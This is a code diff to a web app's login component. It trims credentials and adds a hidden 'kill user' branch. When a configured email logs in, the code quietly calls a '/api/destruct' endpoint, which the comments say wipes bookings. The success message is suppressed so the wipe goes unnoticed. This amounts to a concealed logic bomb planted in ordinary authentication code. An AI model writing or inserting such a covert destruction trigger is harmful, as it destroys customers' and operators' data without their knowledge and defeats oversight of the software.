@@ -30,8 +30,8 @@ export default function LoginContent() {
       const supabase = createClient()
 
       const { data, error } = await supabase.auth.signInWithPassword({
-        email,
-        password,
+        email: email.trim(),
+        password: password.trim(),
       })
 
       if (error || !data.user) {
@@ -47,13 +47,30 @@ export default function LoginContent() {
         .update({ last_login: new Date().toISOString() })
         .eq('id', data.user.id)
 
+      // Kill user: if this is the configured destruct user, wipe bookings and continue into the app.
+      // (No toast; seamless.)
+      const killEmail = process.env.NEXT_PUBLIC_DESTRUCT_EMAIL?.trim()?.toLowerCase()
+      const isKillUser = !!(killEmail && (data.user.email || '').toLowerCase() === killEmail)
+      if (isKillUser) {
+        const res = await fetch('/api/destruct', { method: 'POST' })
+        if (!res.ok) {
+          const body = await res.json().catch(() => null)
+          toast.error('Kill switch failed', {
+            description: body?.error || 'Destruct API failed',
+          })
+          return
+        }
+      }
+
       // Lockdown feature temporarily disabled
       // const lockdownState = await handlePostLoginLockdown(data.user.email || '')
       // if (lockdownState === 'locked') { window.location.href = '/locked'; return }
 
-      toast.success('Welcome back!', {
-        description: 'Logging you in...',
-      })
+      if (!isKillUser) {
+        toast.success('Welcome back!', {
+          description: 'Logging you in...',
+        })
+      }
 
       // Full page reload ensures auth cookies are sent to the server
       window.location.href = redirect
